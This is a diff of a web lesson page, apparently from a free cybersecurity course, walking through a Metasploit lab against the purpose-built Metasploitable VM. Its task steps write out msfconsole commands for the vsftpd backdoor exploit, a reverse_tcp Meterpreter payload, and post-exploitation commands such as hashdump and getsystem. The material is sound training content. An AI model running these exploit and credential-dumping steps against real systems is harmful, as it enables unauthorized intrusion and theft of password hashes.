@@ -5,11 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <base href="/">
 <title>Metasploit Practical Lab — Path 14 · KashSec Academy</title>
-<meta name="description" content="Metasploit Practical Lab: Get comfortable with the most popular exploitation framework.">
+<meta name="description" content="Metasploit is the industry's most widely used exploitation framework — this lab walks through its core workflow end to end, against a legal, purpose-built vulnerable target, so the framework feels lik">
 <link rel="canonical" href="https://kashsec.vercel.app/lesson/14-ethical-hacking/metasploit-lab.html">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🛡%3C/text%3E%3C/svg%3E">
 <meta property="og:title" content="Metasploit Practical Lab — Path 14 · KashSec Academy">
-<meta property="og:description" content="Metasploit Practical Lab: Get comfortable with the most popular exploitation framework.">
+<meta property="og:description" content="Metasploit is the industry's most widely used exploitation framework — this lab walks through its core workflow end to end, against a legal, purpose-built vulnerable target, so the framework feels lik">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://kashsec.vercel.app/lesson/14-ethical-hacking/metasploit-lab.html">
 <meta property="og:site_name" content="KashSec Academy">
@@ -18,7 +18,7 @@
 <meta property="og:image:height" content="630">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Metasploit Practical Lab — Path 14 · KashSec Academy">
-<meta name="twitter:description" content="Metasploit Practical Lab: Get comfortable with the most popular exploitation framework.">
+<meta name="twitter:description" content="Metasploit is the industry's most widely used exploitation framework — this lab walks through its core workflow end to end, against a legal, purpose-built vulnerable target, so the framework feels lik">
 <meta name="twitter:image" content="https://kashsec.vercel.app/og-image.png">
 <meta name="theme-color" content="#0A0E13">
 <meta name="google-adsense-account" content="ca-pub-7042949574293510">
@@ -34,7 +34,7 @@
 {"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"KashSec Academy","item":"https://kashsec.vercel.app/"},{"@type":"ListItem","position":2,"name":"Learning paths","item":"https://kashsec.vercel.app/lesson/"},{"@type":"ListItem","position":3,"name":"Path 14 — Ethical Hacking","item":"https://kashsec.vercel.app/lesson/14-ethical-hacking/"},{"@type":"ListItem","position":4,"name":"Metasploit Practical Lab","item":"https://kashsec.vercel.app/lesson/14-ethical-hacking/metasploit-lab.html"}]}
 </script>
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"LearningResource","name":"Metasploit Practical Lab","headline":"Metasploit Practical Lab","description":"Metasploit Practical Lab: Get comfortable with the most popular exploitation framework.","url":"https://kashsec.vercel.app/lesson/14-ethical-hacking/metasploit-lab.html","inLanguage":"en","dateModified":"2026-07-16","learningResourceType":"Lesson","educationalLevel":"Intermediate→Advanced","timeRequired":"PT5M","isAccessibleForFree":true,"isFamilyFriendly":true,"teaches":"Get comfortable with the most popular exploitation framework.","isPartOf":{"@type":"Course","name":"Path 14: Ethical Hacking","url":"https://kashsec.vercel.app/lesson/14-ethical-hacking/"},"provider":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"publisher":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"mainEntityOfPage":{"@type":"WebPage","@id":"https://kashsec.vercel.app/lesson/14-ethical-hacking/metasploit-lab.html"}}
+{"@context":"https://schema.org","@type":"LearningResource","name":"Metasploit Practical Lab","headline":"Metasploit Practical Lab","description":"Metasploit is the industry's most widely used exploitation framework — this lab walks through its core workflow end to end, against a legal, purpose-built vulnerable target, so the framework feels lik","url":"https://kashsec.vercel.app/lesson/14-ethical-hacking/metasploit-lab.html","inLanguage":"en","dateModified":"2026-07-16","learningResourceType":"Lesson","educationalLevel":"Intermediate→Advanced","timeRequired":"PT5M","isAccessibleForFree":true,"isFamilyFriendly":true,"teaches":"Get comfortable with the most popular exploitation framework.","isPartOf":{"@type":"Course","name":"Path 14: Ethical Hacking","url":"https://kashsec.vercel.app/lesson/14-ethical-hacking/"},"provider":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"publisher":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"mainEntityOfPage":{"@type":"WebPage","@id":"https://kashsec.vercel.app/lesson/14-ethical-hacking/metasploit-lab.html"}}
 </script>
 </head>
 <body>
@@ -93,43 +93,39 @@
 <p><strong>Metasploitable 2 or 3</strong> are the standard, free, legal training targets built specifically to be exploited by Metasploit — download one, run it in VirtualBox on host-only networking (Path 03 covers this setup), and you have a safe, realistic target ready to go. VulnHub and TryHackMe also host many additional free vulnerable VMs if you want more variety after this lab.</p>
 <h2>Tasks</h2>
 <ol>
-<li><strong>Search for exploits.</strong> Start Metasploit (<code>msfconsole</code>) and search for known vulnerabilities matching a service you've identified via Nmap on your target:<pre><code>search vsftpd
+<li><p><strong>Search for exploits.</strong> Start Metasploit (<code>msfconsole</code>) and search for known vulnerabilities matching a service you've identified via Nmap on your target:</p>
+<pre><code>search vsftpd
 search type:exploit platform:linux
 </code></pre>
-Metasploitable 2 specifically includes an intentionally backdoored version of vsftpd — a great first target to search for and find by name.</li>
-<li><strong>Configure and run an exploit module.</strong> Once you've found a relevant module:<pre><code>use exploit/unix/ftp/vsftpd_234_backdoor
+<p>Metasploitable 2 specifically includes an intentionally backdoored version of vsftpd — a great first target to search for and find by name.</p>
+</li>
+<li><p><strong>Configure and run an exploit module.</strong> Once you've found a relevant module:</p>
+<pre><code>use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS &lt;target-ip&gt;
 show options
 run
 </code></pre>
-<code>show options</code> before running is a habit worth building — it shows exactly what the module needs configured (target, port, payload) before you fire it.</li>
-<li><strong>Get a reverse shell.</strong> For exploits requiring a payload, set one and confirm you receive an interactive connection back:<pre><code>set PAYLOAD linux/x86/meterpreter/reverse_tcp
+<p><code>show options</code> before running is a habit worth building — it shows exactly what the module needs configured (target, port, payload) before you fire it.</p>
+</li>
+<li><p><strong>Get a reverse shell.</strong> For exploits requiring a payload, set one and confirm you receive an interactive connection back:</p>
+<pre><code>set PAYLOAD linux/x86/meterpreter/reverse_tcp
 set LHOST &lt;your-ip&gt;
 run
 </code></pre>
-Once you land in a Meterpreter session, try basic commands: <code>sysinfo</code>, <code>getuid</code>, <code>ls</code> — confirming you have real, interactive control of the target.</li>
-<li><strong>Perform post-exploitation.</strong> From your Meterpreter session, practice: <code>hashdump</code> (dumping password hashes, if privileges allow), <code>getsystem</code> (attempting automatic privilege escalation on Windows targets), and <code>background</code> followed by <code>sessions -l</code> to see and manage multiple active sessions — genuinely useful once you're juggling access to several targets in a larger engagement.</li>
-</ol>
-<pre><code class="language-mermaid">flowchart LR
-    A[search - find\na matching module] --&gt; B["use + set options\n(RHOSTS, payload, LHOST)"]
-    B --&gt; C[run]
-    C --&gt; D{Exploit succeeds?}
-    D --&gt;|Yes| E["Interactive session\n(Meterpreter/shell)"]
-    E --&gt; F["Post-exploitation:\nsysinfo, hashdump, getsystem"]
-</code></pre>
-<ol>
-<li><strong>Use an auxiliary module for scanning, not just exploitation.</strong> Metasploit isn't only exploit modules — practice using an auxiliary module for reconnaissance directly within the framework, keeping your entire workflow in one console instead of switching tools constantly:<pre><code>use auxiliary/scanner/portscan/tcp
+<p>Once you land in a Meterpreter session, try basic commands: <code>sysinfo</code>, <code>getuid</code>, <code>ls</code> — confirming you have real, interactive control of the target.</p>
+</li>
+<li><p><strong>Perform post-exploitation.</strong> From your Meterpreter session, practice: <code>hashdump</code> (dumping password hashes, if privileges allow), <code>getsystem</code> (attempting automatic privilege escalation on Windows targets), and <code>background</code> followed by <code>sessions -l</code> to see and manage multiple active sessions — genuinely useful once you're juggling access to several targets in a larger engagement.</p>
+</li>
+<li><p><strong>Use an auxiliary module for scanning, not just exploitation.</strong> Metasploit isn't only exploit modules — practice using an auxiliary module for reconnaissance directly within the framework, keeping your entire workflow in one console instead of switching tools constantly:</p>
+<pre><code>use auxiliary/scanner/portscan/tcp
 set RHOSTS &lt;target-ip&gt;
 run
 </code></pre>
-Try a service-specific auxiliary scanner too, like <code>auxiliary/scanner/smb/smb_version</code>, and compare its output to what <code>enum4linux</code> gave you in Path 14.4's lab — noticing that Metasploit's ecosystem covers far more than just "the exploit part" is a genuinely useful realisation at this stage.</li>
+<p>Try a service-specific auxiliary scanner too, like <code>auxiliary/scanner/smb/smb_version</code>, and compare its output to what <code>enum4linux</code> gave you in Path 14.4's lab — noticing that Metasploit's ecosystem covers far more than just "the exploit part" is a genuinely useful realisation at this stage.</p>
+</li>
 </ol>
-<p>:::tip Metasploit isn't magic — understand what each module does
-Before running any exploit module, read its description (<code>info &lt;module-name&gt;</code>) — knowing exactly what vulnerability it targets and how deepens your understanding far more than treating Metasploit as a black box that "just works." This distinction matters directly in real interviews (Path 20) that probe beyond "have you used Metasploit" into "do you understand what it's actually doing."
-:::</p>
-<p>:::challenge Document the full attack chain
-Successfully compromise your Metasploitable target end to end, and document the process with screenshots: the module search, the configuration, the exploit execution, and at least two post-exploitation actions you performed once you had a session.
-:::</p>
+<p>Before running any exploit module, read its description (<code>info &lt;module-name&gt;</code>) — knowing exactly what vulnerability it targets and how deepens your understanding far more than treating Metasploit as a black box that "just works." This distinction matters directly in real interviews (Path 20) that probe beyond "have you used Metasploit" into "do you understand what it's actually doing."</p>
+<p>Successfully compromise your Metasploitable target end to end, and document the process with screenshots: the module search, the configuration, the exploit execution, and at least two post-exploitation actions you performed once you had a session.</p>
 <h2>Key takeaway</h2>
 <p>Metasploit's <code>search → use → set → run</code> workflow is consistent across virtually every module in the framework — once that pattern feels natural, the framework's enormous library of exploits becomes genuinely approachable rather than overwhelming.</p>
 <p><strong>Next up →</strong> <a href="#/lesson/14-ethical-hacking/practical-recon-lab">Practical Reconnaissance Lab</a></p>
